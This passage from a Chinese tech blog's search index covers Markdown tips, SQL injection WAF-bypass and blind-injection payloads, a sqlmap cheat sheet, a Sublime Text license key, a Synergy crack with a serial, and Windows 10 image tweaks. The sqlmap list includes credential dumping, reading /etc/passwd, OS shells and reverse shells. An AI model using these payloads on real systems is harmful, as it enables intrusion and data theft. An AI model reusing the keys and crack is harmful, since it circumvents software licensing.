<h2 id><a href="#" class="headerlink" title="- - -"></a>- - -</h2><hr>
<hr>
<hr>
<hr>
<hr>
<hr>
<hr>
<h1 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h1><p><strong>分割线后面的冒号表示对齐方式，写在左边表示左对齐，右边为右对齐，两边都写表示居中</strong></p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">//例子一</span><br><span class="line">|123|234|345|</span><br><span class="line">|:--|:--:|--:|</span><br><span class="line">|abc|bcd|cde|</span><br><span class="line">|abc|bcd|cde|</span><br><span class="line">|abc|bcd|cde|</span><br><span class="line">//例子二</span><br><span class="line">|123|234|345|</span><br><span class="line">|:---|:---:|---:|</span><br><span class="line">|abc|bcd|cde|</span><br><span class="line">|abc|bcd|cde|</span><br><span class="line">|abc|bcd|cde|</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>效果</strong>：</p>
<p>//例子一<br>|123|234|345|<br>|:—|:—:|—:|<br>|abc|bcd|cde|<br>|abc|bcd|cde|<br>|abc|bcd|cde|<br>//例子二<br>|123|234|345|<br>|:—|:—:|—:|<br>|abc|bcd|cde|<br>|abc|bcd|cde|<br>|abc|bcd|cde|</p>
<hr>
<h1 id="短路缩进（空格）"><a href="#短路缩进（空格）" class="headerlink" title="短路缩进（空格）"></a>短路缩进（空格）</h1><figure class="highlight md"><table><tr><td class="code"><pre><span class="line">半方大的空白&amp;#8194;看，飞碟</span><br><span class="line">全方大的空白&amp;#8195;看，飞碟</span><br><span class="line">不断行的空白格&amp;#160;看，飞碟</span><br><span class="line">  段落从此开始。</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>效果</strong>：</p>
<p>半方大的空白&#8194;看，飞碟<br>全方大的空白&#8195;看，飞碟<br>不断行的空白格&#160;看，飞碟<br>  段落从此开始。</p>
<hr>
<h1 id="页面内跳转"><a href="#页面内跳转" class="headerlink" title="页面内跳转"></a>页面内跳转</h1><p><strong>通过在标签中使用id定义锚点然后跳转</strong></p>
<p><strong>先定义跳转锚点</strong></p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">//通过span标签</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span> = <span class="string">&quot;a&quot;</span>&gt;</span></span>锚点<span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">//通过h标签</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span> = <span class="string">&quot;1&quot;</span>&gt;</span></span>锚点<span class="xml"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">id</span> = <span class="string">&quot;anchor&quot;</span>&gt;</span></span>锚点<span class="xml"><span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p><strong>跳转</strong></p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">[<span class="string">回到顶部</span>](<span class="link">#a</span>)</span><br><span class="line">[<span class="string">回到顶部</span>](<span class="link">#1</span>)</span><br><span class="line">[<span class="string">回到顶部</span>](<span class="link">#anchor</span>)</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>效果</strong>：</p>
<p><a href="#a">回到顶部</a></p>
<hr>
]]></content>
      <categories>
        <category>Markdown</category>
      </categories>
      <tags>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入与SQL忙注漏洞</title>
    <url>/2019/12/21/SQL%E6%B3%A8%E5%85%A5%E4%B8%8ESQL%E5%BF%99%E6%B3%A8%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="一、绕过WAF的方法："><a href="#一、绕过WAF的方法：" class="headerlink" title="一、绕过WAF的方法："></a>一、绕过WAF的方法：</h1><ul>
<li><p>大小写绕过</p>
</li>
<li><p>简单编码绕过</p>
</li>
<li><p>注释绕过：<br>  如?id=1 uni//on sele//ct 1,2,3 #</p>
</li>
<li><p>分隔重写绕过：<br>  适用于WAF采用正则表达式检测所有的敏感字的情况，可以通过注释分开敏感字，如?id=1 un//ion sel//ect 1,2,3 #；至于重写绕过，适用于WAF过滤了一次的情况，如uniunionon，有时候可能还有多次过滤的情况，这时多次尝试也可以。</p>
</li>
<li><p>HTTP参数污染(HPP)：<br>  如?id=1 union select 1,2,3 from users where id=1 #<br>  这时可以改为?id=1 union select 1&amp;id=2,3 from users where id=1 #<br>  次数&amp;id=会在查询时变成逗号，具体细节取决于 WAF ；<br>  这个例子也同理：?id=1//union/&amp;id=/select/&amp;id=/pwd/&amp;id=/from/&amp;id=/users #<br>  如果服务器代码为： select from table where a=”.$_GET[‘a’].” and b=”.$_GET[‘b’].” limit “.$_GET[‘c’]; 那么可以构造这样的注入语句： ?a=1 union/&amp;b=/select 1,pass/&amp;c=/from users # 最终解析为： select from table where a=1 union/ and b=/select 1,pass/limit /from users # 可以看到，这种方式比较适合白盒测试。</p>
</li>
<li><p>使用逻辑运算符 or /and 绕过：</p>
<a id="more"></a>
<p>  如?id=1 or 0x50=0x50<br>  ?id=1 and ascii(lower(mid((select pwd from users limit 1,1),1,1)))=74，其中select pwd from users limit 1,1是从 users 表里查询 pwd 字段的第一条记录， 然后 mid()就是取该记录的第一个字符， lower()把字符转换为小写， ascii 把 该字符转换成 ascii 码，最后判断等不等于 74。</p>
</li>
<li><p>比较操作符替换：比较操作符如!=、&lt;&gt;、&lt;、&gt;都可以用来替换=来绕过。</p>
</li>
<li><p>同功能函数替换：<br>  substring()可以用mid()、substr()这些函数来替换，都是用来取字符串的某一位字符的；<br>  ascii()编码可以用 hex()、bin()，即十六进制和二进制编码替换；<br>  在使用在基于延时的盲注中benchmark()和sleep()可以相互替换；<br>  group_concat 、 concat 、concat_ws 三者可以互相替换；<br>  还有一种新的方法 ，3条语句分别如下<br>  substring((select ‘password’),1,1) = 0x70<br>  substr((select ‘password’),1,1) = 0x70<br>  mid((select ‘password’),1,1) = 0x70<br>  都是从 password 里判断第一个字符的值，可以用<br>  strcmp(left(‘password’,1), 0x69) = 1<br>  strcmp(left(‘password’,1), 0x70) = 0<br>  strcmp(left(‘password’,1), 0x71) = -1<br>  替换，left 用来取字符串左起 1 位的值，strcmp 用来比较两个值，如果比较结果相等就为 0，左边小的话就为-1，否则为 1。</p>
</li>
<li><p>盲注无需or和and:<br>  例句：index.php?id=1<br>  当and和or被过滤时，可以将 1修改为是通过语句生成的， index.php?uid=strcmp(left((select+hash+from+users+limit+0,1),1),0x42)+123，123 的时候页面是正确的，现在再盲猜 hash 的第一位，如果第一位等于 0x42 也就是 B，那么strcmp结果为0，0+123=123，所以页面应该是正确的。否则就说明不是 B，就这样猜，不用 and 和 or 了。</p>
</li>
<li><p>加括号：<br>  如?id=(1)union(select(1),mid(hash,1,32)from(users))<br>  ?id=(1)union(((((((select(1),hex(hash)from(users))))))))<br>  ?id=(1)or(0x50=0x50)<br>  11.缓冲区溢出绕过：<br>  如id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAA)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10 #<br>  其中 A 越多越好，一般要求 1000 个以上。</p>
</li>
</ul>
<h1 id="二、检测方法："><a href="#二、检测方法：" class="headerlink" title="二、检测方法："></a>二、检测方法：</h1><ul>
<li><p>基于报错的检测方法：<br>使用各种符号以及组合： ‘ “ ( %<br>如直接在URL后添加单引号看是否报错index.php?id=1’</p>
</li>
<li><p>基于布尔的检测：<br>最常用的如1’ and ‘1’=’1和1’ and ‘1’=’2 相当于 1’ and ‘1和1’ and ‘0<br>当返回的结果不同时即有漏洞</p>
</li>
<li><p>直接在URL地址后面加-1、-0、’%2B’和’%2B’a：<br>添加-1：index.php?id=123-1，当前后访问的页面不同时，即可确定存在数字型SQL注入漏洞；<br>添加-0：index.php?id=123-0，当前后访问的页面相同时，再加上-1，返回错误页面，则表示存在数字型SQL注入漏洞；<br>添加’%2B’和’%2B’a：这里%2B为‘+’的URL编码，当先添加’%2B’时index.php?id=123’%2B’返回同样的页面，而添加’%2B’a时返回错误，这种适用于SQL语句中id值被一对单引号括起来的情况。</p>
</li>
<li><p>判断盲注的常用方法：<br>1’ and 1=1 #<br>1’ and 1=2 #<br>判断这两种不同的输入是否有不一样的显示，如果一个正常一个通用的错误提示或者啥也不显示，则几乎可以确定是含有SQL注入漏洞的。</p>
</li>
</ul>
<h1 id="三、防御方法："><a href="#三、防御方法：" class="headerlink" title="三、防御方法："></a>三、防御方法：</h1><p>关键是对所有用户的输入进行严格的检查过滤、对数据库配置使用最小权限原则。<br>常用的修复方案：<br>（1）所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中。</p>
<p>（2）过滤危险的 SQL 语句关键字。</p>
<p>（3）确认每种数据的类型。</p>
<p>（4）数据长度应该严格规定。</p>
<p>（5）网站每个数据层的编码统一。</p>
<p>（6）严格限制网站用户的数据库的操作权限。</p>
<p>（7）避免网站显示 SQL 错误信息。</p>
<p>（8）在网站发布之前建议使用一些专业的 SQL 注入检测工具进行检测。</p>
<p>（9）升级 web 服务器运行平台软件补丁，建议使用 WAF 防护。</p>
<p>其实最有效的防御手段是下面两种：</p>
<p>1、预编译：<br>原理是采用PreparedStatement将相应的SQL语句预先编译好，即SQL引擎会预先进行语法分析，产生语法树，生成执行计划，从而无论用户输入什么内容即使是sql命令都不会影响该SQL语句的语法结构而只能当成是字符串字面值参数。但并不是所有场景都能采用SQL预编译的，如需要进行一些字符串拼接的方式，这时便需要严格检查参数的数据类型以及采用一些安全函数来处理。<br>其过程如下:<br>（1）定义预编译的sql语句，其中待填入的参数用?占位。<br>（2）创建预编译Statement，并把sql语句传入。此时sql语句已与此preparedStatement绑定。所以第4步执行语句时无需再把sql语句作为参数传入execute()。<br>（3）填入具体参数。通过setXX(问号下标，数值）来为sql语句填入具体数据。问号下标从1开始，setXX与数值类型有关，字符串就是setString（index，str）。<br>（4）执行预处理对象。<br>例子：<br>String sql=”select id,no from user where id=?”;<br>PreparedStatement ps = conn.prepareStatement(sql);<br>prestmt.setInt(1,id);<br>prestmt.executeQuery();</p>
<p>2、变量绑定：<br>是指在sql语句的条件中使用变量而不是常量，是为了减少解析的。具体的细节网上很多</p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>SqlMap语法</title>
    <url>/2019/10/14/SqlMap%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<h1 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 基础步骤</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --current-user <span class="comment">#获取当前用户名称</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --current-db <span class="comment">#获取当前数据库名称</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --tables -D <span class="string">&quot;db_name&quot;</span> <span class="comment">#列表名</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --columns -T <span class="string">&quot;tablename&quot;</span> users-D <span class="string">&quot;db_name&quot;</span> -v 0 <span class="comment">#列字段</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --dump -C <span class="string">&quot;column_name&quot;</span> -T <span class="string">&quot;table_name&quot;</span> -D <span class="string">&quot;db_name&quot;</span> -v 0 <span class="comment">#获取字段内容</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 信息获取</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --smart --level 3 --users <span class="comment"># smart 智能 level 执行测试等级</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://92.168.109.139/news?id=1&quot;</span> --dbms <span class="string">&quot;Mysql&quot;</span> --users <span class="comment"># dbms 指定数据库类型</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --users <span class="comment">#列数据库用户</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --dbs<span class="comment">#列数据库</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --passwords <span class="comment">#数据库用户密码</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --passwords-U root -v 0 <span class="comment">#列出指定用户数据库密码</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --dump -C <span class="string">&quot;password,user,id&quot;</span> -T <span class="string">&quot;tablename&quot;</span> -D <span class="string">&quot;db_name&quot;</span> --start 1 --stop 20 <span class="comment">#列出指定字段，列出 20 条</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --dump-all -v 0 <span class="comment">#列出所有数据库所有表</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --privileges <span class="comment">#查看权限</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --privileges -U root <span class="comment">#查看指定用户权限</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --is-dba -v 1 <span class="comment">#是否是数据库管理员</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --roles <span class="comment">#枚举数据库用户角色</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --udf-inject <span class="comment">#导入用户自定义函数（获取系统权限！）</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --dump-all --exclude-sysdbs -v 0 <span class="comment">#列出当前库所有表</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --union-cols <span class="comment">#union 查询表记录</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http:/192.168.56.3/news?id=1&quot;</span> --cookie <span class="string">&quot;COOKIE_VALUE&quot;</span> <span class="comment">#cookie 注入</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> -b <span class="comment">#获取 banner 信息</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --data <span class="string">&quot;id=3&quot;</span> <span class="comment">#post 注入</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> -v 1 -f <span class="comment">#指纹判别数据库类型</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --proxy<span class="string">&quot;http://127.0.0.1:8118&quot;</span> <span class="comment">#代理注入</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span>--string<span class="string">&quot;STRING_ON_TRUE_PAGE&quot;</span> <span class="comment">#指定关键词</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --sql-shell <span class="comment">#执行指定 sql 命令</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --file /etc/passwd  <span class="comment">#必须为dbs权限</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --file-write 本地文件路径 file-dest 目标路径  <span class="comment">#必须为dbs权限(可将本地的某个文件写入到目标路径下)</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --os-cmd=whoami <span class="comment">#执行系统命令</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --os-shell <span class="comment">#系统交互 shell</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --os-pwn <span class="comment">#反弹 shell</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --reg-read <span class="comment">#读取 win 系统注册表</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --dbs-o <span class="string">&quot;sqlmap.log&quot;</span> <span class="comment">#保存进度</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --dbs -o <span class="string">&quot;sqlmap.log&quot;</span> --resume <span class="comment">#恢复已保存进度</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --msf-path=/opt/metasploit3/msf2 --os-pwn 反弹 shell 需 metasploit 路径</span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --tamper <span class="string">&quot;base64encode.py&quot;</span> 加载脚本(可利用绕过注入限制)</span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --batch --tamper <span class="string">&quot;base64encode.py&quot;</span> 加载脚本(可利用绕过注入限制)</span><br><span class="line">sqlmap -g <span class="string">&quot;google 语法&quot;</span> --dump-all --batch <span class="comment">#google 搜索注入点自动 跑出所有字段</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --forms  <span class="comment">#post提交方式注入</span></span><br><span class="line">sqlmap.py -r 本地数据包路径 <span class="comment">#post提交方式注入</span></span><br></pre></td></tr></table></figure>
<h1 id="例"><a href="#例" class="headerlink" title="例"></a>例</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&amp;Submit=Submit&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=41aa833e6d0d28f489ff1ab5a7531406&quot;</span> --string=<span class="string">&quot;Surname&quot;</span> --dbms=mysql --users --password</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>SqlMap</tag>
      </tags>
  </entry>
  <entry>
    <title>Sublime-Text3-汉化激活</title>
    <url>/2019/10/06/Sublime-Text3-%E6%B1%89%E5%8C%96%E6%BF%80%E6%B4%BB/</url>
    <content><![CDATA[<h1 id="激活"><a href="#激活" class="headerlink" title="激活"></a>激活</h1><p>点击状态栏的help(帮助)，再点击进入enter lisence (输入祖册码) ，跳出来一个对话框，把下面的激活码复制进去即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----- BEGIN LICENSE -----</span><br><span class="line">sgbteam</span><br><span class="line">Single User License</span><br><span class="line">EA7E-1153259</span><br><span class="line">8891CBB9 F1513E4F 1A3405C1 A865D53F</span><br><span class="line">115F202E 7B91AB2D 0D2A40ED 352B269B</span><br><span class="line">76E84F0B CD69BFC7 59F2DFEF E267328F</span><br><span class="line">215652A3 E88F9D8F 4C38E3BA 5B2DAAE4</span><br><span class="line">969624E7 DC9CD4D5 717FB40C 1B9738CF</span><br><span class="line">20B3C4F1 E917B5B3 87C38D9C ACCE7DD8</span><br><span class="line">5F7EF854 86B9743C FADC04AA FB0DA5C0</span><br><span class="line">F913BE58 42FEA319 F954EFDD AE881E0B</span><br><span class="line">------ END LICENSE ------</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="汉化"><a href="#汉化" class="headerlink" title="汉化"></a>汉化</h1><ul>
<li><p>按<code>Ctrl + ~</code>,调出调出的控制台</p>
</li>
<li><p>输入指令安装 package control</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import urllib.request,os;pf&#x3D;&#39;Package Control.sublime-package&#39;;ipp&#x3D;sublime.installed_packages_path();urllib.request.install_opener(urllib.request.build_opener(urllib.request.ProxyHandler()));open(os.path.join(ipp,pf),&#39;wb&#39;).write(urllib.request.urlopen(&#39;http:&#x2F;&#x2F;sublime.wbond.net&#x2F;&#39;+pf.replace(&#39; &#39;,&#39;%20&#39;)).read())</span><br></pre></td></tr></table></figure>
<p>稍等片刻，状态栏preferences(首选项)中出现<code>package control</code> 说明安装成功了</p>
<ul>
<li>点击状态栏目<code>preferences(首选项)</code> <code>==&gt;</code> <code>package control</code> 或快捷键 <code>Ctrl + Shift + P</code> 调出 <code>package control</code> 输入 <code>install package</code> 回车，等待片刻，然后查找 <code>ChineseLocalizations</code>插件，选择安装成功后会自动切换成中文简体，可在帮助(<code>help</code>) <code>==&gt;</code> <code>Language</code> 中设置其他语言</li>
</ul>
]]></content>
      <tags>
        <tag>Sublime Text 3</tag>
      </tags>
  </entry>
  <entry>
    <title>Synergy一套键鼠控多设备</title>
    <url>/2020/03/22/Synergy%E4%B8%80%E5%A5%97%E9%94%AE%E9%BC%A0%E6%8E%A7%E5%A4%9A%E8%AE%BE%E5%A4%87/</url>
    <content><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p><strong>部分Windows系统没有运行库安装时会提示没权限开启服务，需要装上运行库才能运行</strong></p>
<p><strong>archlinux了直接通过<code>sudo pacman -S community/synergy</code>安装</strong></p>
<a id="more"></a>
<h1 id="共享鼠标键盘神器：Synergy-破解"><a href="#共享鼠标键盘神器：Synergy-破解" class="headerlink" title="共享鼠标键盘神器：Synergy 破解"></a>共享鼠标键盘神器：<code>Synergy</code> 破解</h1><h2 id="修改破解"><a href="#修改破解" class="headerlink" title="修改破解"></a>修改破解</h2><p><strong>原理：修改配置中edition的默认值由3改为1.</strong></p>
<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>修改注册表：<code>synergy.reg</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[HKEY_CURRENT_USER\Software\Synergy\Synergy]</span><br><span class="line">&quot;edition&quot;&#x3D;dword:00000001</span><br></pre></td></tr></table></figure>
<h3 id="Linux-amp-mac"><a href="#Linux-amp-mac" class="headerlink" title="Linux &amp; mac"></a>Linux &amp; mac</h3><p><code>~/.config/Synergy/Synergy.conf</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[General]</span><br><span class="line">edition&#x3D;1</span><br></pre></td></tr></table></figure>
<p>Windows：v1.8.4、v1.8.8；Linux：v1.10.1可用</p>
<p>参考： <a href="https://www.jianshu.com/p/42f28d1b5daa">https://www.jianshu.com/p/42f28d1b5daa</a></p>
<h2 id="序列号"><a href="#序列号" class="headerlink" title="序列号"></a>序列号</h2><p><code>7B76313B70726F3BE5BDAC20E585B33B313B7A7A39323735313040676D61696C2E636F6D3B3B3B7D</code></p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="服务端-键鼠控制端"><a href="#服务端-键鼠控制端" class="headerlink" title="服务端(键鼠控制端)"></a>服务端(键鼠控制端)</h2><p>勾选服务端模式</p>
<p><img src="/.io//synergy0.png" alt="synergy0"></p>
<p>设置服务端 <code>&gt;</code> 通过拖动右上角的图标添加屏幕,也可将已有的拖到左上角删除</p>
<p><img src="/.io//synergy2.png" alt="synergy2"></p>
<p>双击已有的屏幕,<strong>编辑屏幕名</strong> ,也可进行其他配置， <strong>不编辑屏幕名将被拒绝连接</strong></p>
<p><img src="/.io//synergy3.png" alt="synergy3"></p>
<p>可在热键设置中添加热键</p>
<p><img src="/.io//synergy4.png" alt="synergy4"></p>
<p>设置热键行为</p>
<p><img src="/.io//synergy5.png" alt="synergy5"></p>
<h2 id="客户端-被控制端"><a href="#客户端-被控制端" class="headerlink" title="客户端(被控制端)"></a>客户端(被控制端)</h2><p>勾选客户端模式</p>
<p><img src="/.io//synergy1.png" alt="synergy1"></p>
<p>在客户端模式下需要 <strong>填写服务端IP</strong>,并需要向服务端提供屏幕名</p>
<p><img src="/.io//synergy6.png" alt="synergy6"></p>
<p>客户端可自定义屏幕名</p>
<p><img src="/.io//synergy7.png" alt="synergy7"></p>
<p>最后点击右下角的应用然后点开始即可使用了，窗口最小化时将其放到系统托盘，关闭窗口可后台运行（剪切板不共享）</p>
]]></content>
  </entry>
  <entry>
    <title>Windows10镜像优化</title>
    <url>/2019/10/28/Windows10%E9%95%9C%E5%83%8F%E4%BC%98%E5%8C%96/</url>
    <content><![CDATA[<h1 id="PE"><a href="#PE" class="headerlink" title="PE"></a>PE</h1><h1 id="组件移除"><a href="#组件移除" class="headerlink" title="组件移除"></a>组件移除</h1><h2 id="Windows-Apps"><a href="#Windows-Apps" class="headerlink" title="Windows Apps"></a>Windows Apps</h2><h3 id="Metro应用"><a href="#Metro应用" class="headerlink" title="Metro应用"></a>Metro应用</h3><ul>
<li><p>Advertising.Xaml  广告</p>
</li>
<li><p>BingWeather  天气</p>
</li>
</ul>
<a id="more"></a>
<ul>
<li><p>GetHelp  获取帮助</p>
</li>
<li><p>Messaging  消息</p>
</li>
<li><p>MicrosoftofficeHub  Office</p>
</li>
<li><p>MicrosoftSolitaireCollection  纸牌游戏</p>
</li>
<li><p>MicrosoftStivkyNotes  便签</p>
</li>
<li><p>People  人脉</p>
</li>
<li><p>SkypeApp</p>
</li>
<li><p>WindowsAlarms  闹钟</p>
</li>
<li><p>WindowsFeedbackHub  用户反馈</p>
</li>
<li><p>WindowsMaps  地图</p>
</li>
<li><p>Xbox应用</p>
</li>
<li><p>YourPhone  手机</p>
</li>
<li><p>提示</p>
</li>
<li><p>钱包服务</p>
</li>
</ul>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul>
<li><p>OneDrive  微软云盘</p>
</li>
<li><p>Webcam Experience 网络摄像头</p>
</li>
<li><p>Windows Mixed Reality  混合现实</p>
</li>
<li><p>零售演示内容</p>
</li>
</ul>
<h3 id="本地化"><a href="#本地化" class="headerlink" title="本地化"></a>本地化</h3><h3 id="硬件支持"><a href="#硬件支持" class="headerlink" title="硬件支持"></a>硬件支持</h3><ul>
<li>Telephony(电话)</li>
<li>软盘</li>
</ul>
<h3 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h3><ul>
<li><p>付款和NFC/SE管理器</p>
</li>
<li><p>远程桌面客户端</p>
</li>
</ul>
<h3 id="远程控制与隐私"><a href="#远程控制与隐私" class="headerlink" title="远程控制与隐私"></a>远程控制与隐私</h3><ul>
<li>Windows客户体验改善计划</li>
</ul>
<h3 id="远程控制与隐私-1"><a href="#远程控制与隐私-1" class="headerlink" title="远程控制与隐私"></a>远程控制与隐私</h3><ul>
<li><p>Windows 生物识别服务</p>
</li>
<li><p>Windows 客户体验改善计划</p>
</li>
<li><p>远程协助</p>
</li>
<li>远程桌面服务器</li>
<li>远程注册表</li>
</ul>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><h2 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h2><h3 id="OneDrive"><a href="#OneDrive" class="headerlink" title="OneDrive"></a>OneDrive</h3><ul>
<li>OneDrive  云盘</li>
</ul>
<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><ul>
<li>自动安装赞助商应用</li>
</ul>
<h3 id="隐私选项"><a href="#隐私选项" class="headerlink" title="隐私选项"></a>隐私选项</h3><ul>
<li><p>Cortana</p>
</li>
<li><p>偶尔在”开始”屏幕显示建议</p>
</li>
<li><p>可让Microsoft通过使用你的诊断数据</p>
</li>
<li><p>向Microsoft发送有关我的写作习惯信息</p>
</li>
<li><p>启用体验改善计划</p>
</li>
<li><p>收集写作文本(ink-墨迹)让Windows和小娜更好的了解你</p>
</li>
<li>收集通讯录让Windows和小娜更好的了解你</li>
<li>收集键入文本让Windows和小娜更好的了解你</li>
<li>自动安装建议的应用</li>
<li><p>让Skype帮助你联系地址。。。</p>
</li>
<li><p>预安装应用</p>
</li>
</ul>
<h2 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h2><ul>
<li>禁用<br>HomeGroup Listener</li>
</ul>
<p>HomeGroup Provider</p>
<p>Connected User Experiences and Telemetry</p>
<p>Diagnostic Execution Service</p>
<p>Diagnostic Policy Service</p>
<p>Diagnostic Service Host</p>
<p>Diagnostic System Host</p>
<p>DHCP Client</p>
<p>Server   文件共享服务</p>
<ul>
<li>手动<br>Background Intelligent Transfer Service</li>
</ul>
<p>Print Spooler</p>
<p>Task Schedule</p>
<p>TCP/IP NetBIOS helper</p>
<h1 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h1><h1 id="后期任务"><a href="#后期任务" class="headerlink" title="后期任务"></a>后期任务</h1><p>添加命令</p>
<h2 id="关闭休眠"><a href="#关闭休眠" class="headerlink" title="关闭休眠"></a>关闭休眠</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powercfg -h off</span><br></pre></td></tr></table></figure>
<h2 id="开启卓越性能"><a href="#开启卓越性能" class="headerlink" title="开启卓越性能"></a>开启卓越性能</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powercfg -duplicatescheme e9a42b02-d5df-448d-aa00-03f14749eb61</span><br></pre></td></tr></table></figure>
<p>聚焦图<br><code>AppC:\Users\用户名\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\Assets</code></p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
